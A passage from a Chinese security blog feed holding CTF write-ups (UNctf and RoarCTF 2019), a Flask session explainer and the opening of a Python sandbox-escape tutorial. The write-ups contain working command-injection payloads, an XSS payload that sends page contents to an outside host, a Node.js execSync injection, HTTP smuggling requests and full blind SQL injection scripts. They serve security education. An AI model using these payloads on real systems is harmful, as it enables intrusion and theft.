by_src;sid=10002;classtype:webscan;rev=1)</code></pre><p>这样5分钟内发出三次请求就会被检测到。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNctf 赛后回顾</title>
      <link href="/2019/11/20/unctf/"/>
      <url>/2019/11/20/unctf/</url>
      
        <content type="html"><![CDATA[<h1 id="UNctf-赛后回顾"><a href="#UNctf-赛后回顾" class="headerlink" title="UNctf 赛后回顾"></a>UNctf 赛后回顾</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>题目源码：</p><pre><code>&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    if (preg_match(&quot;/\&apos;|\&quot;|,|;|\\|\`|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))        $a = &quot;&quot;;        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;    if (preg_match(&quot;/\&apos;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))        $b = &quot;&quot;;        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;     $cmd = &quot;file $a $b&quot;;      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;);      system($cmd);?&gt;</code></pre><h3 id="one-way"><a href="#one-way" class="headerlink" title="one way"></a>one way</h3><p>正则黑名单匹配，对输入的参数强制加上双引号，即使我们绕过检测也会被加上双引号无法执行命令。这里用到了反引号 ```</p><p>观察第一个正则 `\|`` 三个反斜杠才能转义反斜杠，这里对 | 进行了转义从而造成反引号逃逸。</p><pre><code>&lt;?php$a = &quot;`dir`&quot;;if (preg_match(&quot;/\&apos;|\&quot;|,|;|\\|\`/is&quot;,$a))    $a = &quot;&quot;;    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;    var_dump($a);string(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>可以看到反引号成功逃逸。</p><p>我们到题目中尝试列目录，没有 <code>ls</code> 可以用 <code>dir</code></p><pre><code>?a=`dir%20/`响应：bin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\011mnt proc run\011 srv\011 sys\011usr\012boot etc lib\011 media\011opt root sbin start.sh tmp\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>查找flag </p><pre><code>?a=`/b??/gr??%20-R%20unctf`响应：.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h2><p>第二个正则 <code>\\|\n</code> 会解释为竖线和换行，所以利用 <code>%0a</code> 进行换行绕过，同时末尾使用 <code>%20#</code> 来终止命令处理双引号</p><pre><code>?a=\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23效果是file&quot;\&quot;&quot;/???/gr?p -R ctf #&quot;</code></pre><h2 id="easy-xss"><a href="#easy-xss" class="headerlink" title="easy xss"></a>easy xss</h2><p>在留言板处提交 xss 发现能够触发，访问储存的路径发现一个接口</p><pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>此时的请求头里带上了 <code>XMLHttpRequest</code> ，同时不带参数访问时得到 debug 页面，可以看到 XHR请求带上了 cookie ，于是我们构造 XHR 请求</p><pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=newXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;xmlhttp.responseText.match(&apos;flag\\{(.\*?)\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\&gt;</code></pre><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>查看源码发现各个接口</p><pre><code>      switch (e.cmd) {        case &apos;name&apos;:          this.nickname = e.msg,          this.kesshoubanMsg(`Change nickname ${this.nickname        }         success!`);        break;      case &apos;error&apos;:        this.kesshoubanMsg(`🙁${e.msg    }    `);    break;  case &apos;calc&apos;:    this.kesshoubanMsg(`${e.msg  }  `);  break;case &apos;flag&apos;:  this.kesshoubanMsg(`${e.msg}`);</code></pre><p>修改完名字后测试 <code>/calc 1+1</code> 发现成功执行，存在代码注入参考<a href="http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p><p>尝试 <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> 其中空格过滤绕过 $IFS ，同时Sync采用非阻塞返回。</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask-session</title>
      <link href="/2019/11/06/flask-session/"/>
      <url>/2019/11/06/flask-session/</url>
      
        <content type="html"><![CDATA[<h1 id="flask-session"><a href="#flask-session" class="headerlink" title="flask-session"></a>flask-session</h1><p>11/6/2019 8:43:45 PM </p><p>搬运文章 <a href="https://cizixs.com/2017/03/08/flask-insight-session/" target="_blank" rel="noopener">https://cizixs.com/2017/03/08/flask-insight-session/</a></p><p><strong>session是如何使用的：</strong></p><p>cookie和session结合使用：web开发发展至今，cookie和session的使用已经出现了一些非常成熟的方案。在如今的市场或者企业里，一般有两种存储方式：</p><ul><li><p>存储在服务端：通过cookie存储一个<code>session_id</code>，然后具体的数据则是保存在session中。如果用户已经登录，则服务器会在cookie中保存一个<code>session_id</code>，下次再次请求的时候，会把该<code>session_id</code>携带上来，服务器根据session_id在session库中获取用户的session数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做<code>server side session</code>。</p></li><li><p>将session数据加密，然后存储在cookie中。这种专业术语叫做<code>client side session</code>。flask采用的就是这种方式，但是也可以替换成其他形式。</p></li></ul><p>在解析 session 的实现之前，我们先介绍一下 session 怎么使用。session 可以看做是在不同的请求之间保存数据的方法，因为 HTTP 是无状态的协议，但是在业务应用上我们希望知道不同请求是否是同一个人发起的。比如购物网站在用户点击进入购物车的时候，服务器需要知道是哪个用户执行了这个操作。</p><p>在 flask 中使用 session 也很简单，只要使用 from flask import session 导入这个变量，在代码中就能直接通过读写它和 session 交互。</p><pre><code>from flask import Flask, session, escape, requestapp = Flask(__name__)app.secret_key = &apos;please-generate-a-random-secret_key&apos;@app.route(&quot;/&quot;)def index():    if &apos;username&apos; in session:        return &apos;hello, {}\n&apos;.format(escape(session[&apos;username&apos;]))    return &apos;hello, stranger\n&apos;@app.route(&quot;/login&quot;, methods=[&apos;POST&apos;])def login():    session[&apos;username&apos;] = request.form[&apos;username&apos;]    return &apos;login success&apos;if __name__ == &apos;__main__&apos;:    app.run(host=&apos;0.0.0.0&apos;, port=5000, debug=True)</code></pre><p>上面这段代码模拟了一个非常简单的登陆逻辑，用户访问 <code>POST /login</code> 来登陆，后面访问页面的时候 <code>GET /</code>，会返回该用户的名字</p><p>直接访问：</p><pre><code>GET / HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateHost: 127.0.0.1:5000User-Agent: HTTPie/0.8.0HTTP/1.0 200 OKContent-Length: 14Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:22:18 GMTServer: Werkzeug/0.11.2 Python/2.7.10hello stranger</code></pre><p>用户名cizixs 模拟登录：</p><pre><code>POST /login HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateContent-Length: 15Content-Type: application/x-www-form-urlencoded; charset=utf-8Host: 127.0.0.1:5000User-Agent: HTTPie/0.8.0username=cizixsHTTP/1.0 200 OKContent-Length: 13Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:20:54 GMTServer: Werkzeug/0.11.2 Python/2.7.10Set-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4; HttpOnly; Path=/login success</code></pre><p>最重要的是我们看到 response 中有 <code>Set-Cookie</code> 的头部，cookie 的键是 <code>session</code></p><p>这次请求我们带上上次的 cookie 访问：</p><pre><code>GET / HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateCookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fevg.LE03yEZDWTUMQW-nNkTr1zBEhKkHost: 127.0.0.1:5000User-Agent: HTTPie/0.8.0HTTP/1.0 200 OKContent-Length: 11Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:25:46 GMTServer: Werkzeug/0.11.2 Python/2.7.10Set-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5feyg.sfFCDIqfef4i8cvxUClUUGQNcHA; HttpOnly; Path=/hellocizixs</code></pre><p>可以看到我们成功的不通过用户名登陆。</p><p>总结一下：session 是通过在客户端设置 cookie 实现的，每次客户端发送请求的时候会附带着所有的 cookie，而里面保存着一些重要的信息（比如这里的用户信息），这样服务器端就能知道客户端的信息，然后根据这些数据做出对应的判断，就好像不同请求之间是有记忆的。</p><p><strong>请求过程</strong></p><ul><li>请求过来的时候，flask 会根据 cookie 信息创建出 session 变量（如果 cookie 不存在，这个变量有可能为空），保存在该请求的上下文中</li><li>视图函数可以获取 session 中的信息，实现自己的逻辑处理</li><li>flask 会在发送 response 的时候，根据 session 的值，把它写回到 cookie 中</li></ul><p>注意：session 和 cookie 的转化过程中，应该考虑到安全性，不然直接使用伪造的 cookie 会是个很大的安全隐患。</p><p><strong>加密session</strong></p><p>搬运<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>flask 处理 session 安全性问题时在代码中新建了 <code>URLSafeTimedSerializer</code> 类 ，用它的dumps方法将类型为字典的 <code>session</code> 对象序列化成字符串，然后用 <code>response.set_cookie</code> 将最后的内容保存在cookie中。 </p><p><code>URLSafeTimedSerializer</code> 做了什么？主要经过几步</p><ul><li>json.dumps 将对象转换成json字符串，作为数据</li><li>如果数据压缩后长度更短，则用zlib库进行压缩</li><li>将数据用base64编码</li><li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</li></ul><p>第4步就解决了用户篡改session的问题，因为在不知道 <code>secret_key</code> 的情况下，是无法伪造签名的。注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其 session 的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><p><strong>解密session</strong></p><p>有时候在开发或者调试的过程中，需要了解 cookie 中保存的到底是什么值，可以通过手动解析它的值。session 在 cookie 中的值，是一个字符串，由句号分割成三个部分。第一部分是 base64 加密的数据，第二部分是时间戳，第三部分是校验信息。</p><p>前面两部分的内容可以通过下面的方式获取，代码也可直观，就不给出解释了：</p><pre><code>In [1]: from itsdangerous import *In [2]: s = &apos;eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4&apos;In [3]: data, timstamp, secret = s.split(&apos;.&apos;)In [4]: base64_decode(data)Out[4]: &apos;{&quot;username&quot;:&quot;cizixs&quot;}&apos;In [5]: bytes_to_int(base64_decode(timstamp))Out[5]: 194502054In [7]: time.strftime(&apos;%Y-%m-%d %H:%I%S&apos;, time.localtime(194502054+EPOCH))Out[7]: &apos;2017-03-01 12:1254&apos;</code></pre><p><strong>session使用</strong></p><p>上面看到 session 其实就像一个字典，我们使用的时候可以直接使用：</p><pre><code>session[&apos;name&apos;] = name</code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>roarctf 2019</title>
      <link href="/2019/10/16/roarctf-2019/"/>
      <url>/2019/10/16/roarctf-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="roarctf-2019"><a href="#roarctf-2019" class="headerlink" title="roarctf 2019"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>拿到题目看到文件下载的接口，尝试 <code>/Download?filename=help.docx</code> ,发现没法下载，尝试下载网页上的照片发现也下载不了，后来就跑偏了，在想会不会是 <code>SSTI</code> ?fuzz了半天也没找到思路.  🎨</p><p>改变请求方式为 <code>post</code> 即可成功下载到 <code>help.docx</code> ,里边没有什么有用的信息。 </p><p>随便下载一个不存在的文件，得到报错信息里有服务器版本信息。做的时候就被难到的地方就是文件下载不知道下载什么东西。记得上次碰到这种题的时候还是 <code>SUCTF</code> 读 <code>nginx</code> 配置文件</p><h3 id="什么是-WEB-INF"><a href="#什么是-WEB-INF" class="headerlink" title="什么是 WEB-INF"></a>什么是 WEB-INF</h3><blockquote><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p></blockquote><ol><li><p>/WEB-INF/web.xml</p><p> Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p></li><li><p>/WEB-INF/classes/</p><p> 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。</p></li></ol><p>其他的配置文件介绍看<a href="https://baike.baidu.com/item/web-inf" title="这里" target="_blank" rel="noopener">https://baike.baidu.com/item/web-inf</a></p><p>事实上就是在xml中配置好映射路径然后进行对某些含受保护内容文件的访问。</p><p>我们访问 <code>WEB-INF/web.xml</code> 发现操作flag的关键配置</p><p>按照映射关系访问 <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> 即可得到解密的字符串，base64解密即可</p><h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>右键查看源码</p><pre><code>&lt;?phperror_reporting(0);if(!isset($_GET[&apos;num&apos;])){    show_source(__FILE__);}else{        $str = $_GET[&apos;num&apos;];        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];        foreach ($blacklist as $blackitem) {                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&apos;echo &apos;.$str.&apos;;&apos;);}?&gt; </code></pre><p>有waf，这里有两种方法绕过：</p><ol><li>利用字符串解析特性 Bypass</li></ol><p>原理看这篇文章：<br><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p><p>这里说一下大概意思<br> PHP 处理 GET or POST 请求时将查询字符串转换成数组 <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> 。参数名里的一些字符会被移除或替换成下划线 <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> 如果WAF规则是参数里含有一个非数值型的值时进行拦截时，我们就可以用下列语句绕过<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> 它会被存储在 <code>$_GET[&quot;news_id&quot;]</code> 。</p><p>这是测试php是如何处理特殊字符：</p><pre><code>&lt;?phpforeach(    [        &quot;{chr}foo_bar&quot;,        &quot;foo{chr}bar&quot;,        &quot;foo_bar{chr}&quot;    ] as $k =&gt; $arg) {    for($i=0;$i&lt;=255;$i++) {        echo &quot;\033[999D\033[K\r&quot;;        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);        /* yes... I&apos;ve added a sleep time on each loop just for        the scenic effect :)like that movie with unrealistic        brute-force where the password are obtained        one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ        */        usleep(5000);        if(isset($o[&quot;foo_bar&quot;])) {            echo &quot;\033[999D\033[K\r&quot;;            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\n&quot;;        }    }    echo &quot;\033[999D\033[K\r&quot;;    echo &quot;\n&quot;;}</code></pre><p>这道题目经过测试参数前加一个 <code>%20</code>或者 <code>+</code> 来绕过</p><ol start="2"><li>http协议走私攻击</li></ol><blockquote><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p></blockquote><p>这里我们通过 CL-CL 来Bypass</p><pre><code>POST /calc.php?num=phpinfo() HTTP/1.1Host: ********User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: keep-aliveReferer: **********Cookie: __cfduid=***********X-Forwarded-For: 127.0.0.1Content-Length: 7Content-Length: 7Content-Type: application/x-www-form-urlencodednum=111</code></pre><p>绕过waf之后还禁掉了一些字符不能直接读到 flag 。</p><p>先学习几个函数</p><ul><li>ord — 返回字符的 ASCII 码值</li><li>bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</li><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>dechex — 十进制转换为十六进制</li><li>base_convert — 在任意进制之间转换数字</li><li>hexdec — 十六进制转换为十进制</li></ul><p>读取flag</p><pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h2><p>打开靶机，抓包发现响应头</p><pre><code>&lt;!-- Debug Info:  Duration: 0.058279037475586 s  Current Ip: 127.0.0.1 </code></pre><p>在 XFF 处尝试修改内容，发现可以修改成功。<code>Current Ip</code> 处显示当前的 XFF值，<code>Last Ip</code> 显示上次查询内容。执行 sleep() 语句 <code>1&#39; and sleep(3) and 1=&#39;1</code> 发现在第二次进行修改发包之后成功执行，存在二次注入。</p><p>所谓二次注入就是服务端在第一次接收脏数据时对数据进行了 <code>addslashes</code> 或 <code>mysql_escape_string</code>  处理，但是存入数据库时存的还是脏数据，于是在第二次查询时由于查询的是脏数据，信息仍然会泄露。</p><p>查看源码：</p><pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);$content = str_replace(&quot;&lt;a href=\&quot;&quot;, &quot;&lt;a href=\&quot;/?url=&quot;, $content);$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);echo($content);$end = microtime(true);$time = $end - $start;$last_ip = &quot;&quot;;$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);if(count($result) &gt; 0) {    if($ip !== $result[0][&apos;current_ip&apos;]) {        $last_ip = $result[0][&apos;current_ip&apos;];        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);    } else {        $last_ip = $result[0][&apos;last_ip&apos;];    }}query(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);die(&quot;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>可以看到在查询到数据之后，如果 <code>$ip !== $result[0][&#39;current_ip&#39;]</code> 那么 <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ，随后将 last_ip 不带过滤的带入数据库中查询。</p><p>所以我们注入的思路就是先将 exp 插入数据，然后再正常访问一次将数据带出。</p><p>exp:</p><pre><code>import requestsfrom time import sleepurl = &quot;http://node3.buuoj.cn:28063/&quot;s = requests.session()re = s.get(url)name = &apos;&apos;&quot;&quot;&quot;# database name# current db : ctf# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctffor i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;&quot;&quot;&quot;# table name# ctf : ip_log# F4l9_D4t4B45e : F4l9_t4b1efor i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;&quot;&quot;&quot;# column_name# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMnfor i in range(1,20):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;for i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break</code></pre><p>这个太不优雅了，赵师傅的更优雅：</p><pre><code>#!/usr/bin/env python3import requeststarget = &quot;http://localhost:8302/&quot;def execute_sql(sql):    print(&quot;[*]请求语句：&quot; + sql)    return_result = &quot;&quot;    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;    session = requests.session()    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})    start_pos = r.text.find(&quot;Last Ip: &quot;)    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)    length = int(r.text[start_pos + 9: end_pos])    print(&quot;[+]长度：&quot; + str(length))    for i in range(1, length + 1, 5):        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})        start_pos = r.text.find(&quot;Last Ip: &quot;)        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)        result = int(r.text[start_pos + 9: end_pos])        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)        print(&quot;[+]位置 &quot; + str(i) + &quot; 请求五位成功:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))    return return_result# 获取数据库print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))# 获取数据库表print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))# 获取数据库表print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))# 获取表中内容print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>这里用的是 <code>1&#39;|&#39;1&#39;|&#39;1</code> 然后异或也可以 <code>1&#39;^&#39;0&#39;^&#39;1</code></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p><p><a href="https://paper.seebug.org/1048/#32-cl-cl" target="_blank" rel="noopener">https://paper.seebug.org/1048/#32-cl-cl</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python沙盒逃逸:从头开始</title>
      <link href="/2019/10/11/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2019/10/11/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>10/11/2019 2:26:44 PM </p><h1 id="Python-沙箱逃逸你真的看懂了么？"><a href="#Python-沙箱逃逸你真的看懂了么？" class="headerlink" title="Python 沙箱逃逸你真的看懂了么？"></a>Python 沙箱逃逸你真的看懂了么？</h1><p>python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。</p><p>由于环境中限制了许多敏感模块比如 os 、 sys ，于是我们的重点变成了如何绕过限制去引入能执行我们想要的操作的模块。</p><p>接下来让我们先了解一下 python 的两个非常重要的东西</p><h2 id="type-amp-object"><a href="#type-amp-object" class="headerlink" title="type &amp; object"></a>type &amp; object</h2><p>在 python 里要查看一个类型的父类，使用它的 <strong>base</strong> 属性查看。  在 python 里查看一个实例的类型，使用它的 <strong>class</strong> 属性可以查看，或者使用 type() 函数查看。</p><pre><code>&gt;&gt;&gt; object&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; type&lt;type &apos;type&apos;&gt;</code></pre><p>他们都是 type 的一个实例，表示他们都是类型对象。</p><p>Python 中， object 是父子关系的顶端，所有数据类型的父类都是它； type 是类型实例关系的顶端，所有对象都是它的实例，他们的关系可以描述为: object 是一个 type (object is a instance of type)，即 Object 是 type 的一个实例。</p><pre><code>&gt;&gt;&gt; object.__class__&lt;type &apos;type&apos;&gt;&gt;&gt;&gt; object.__bases__  #站在食物链顶端的男人，没有父类()&gt;&gt;&gt; type.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; type.__class__    #type 的类型是自己&lt;type &apos;type&apos;&gt;</code></pre><p>我们再尝试引入一些内置数据类型来看看：</p><pre><code>&gt;&gt;&gt; list.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; type.__class__&lt;type &apos;type&apos;&gt;&gt;&gt;&gt; 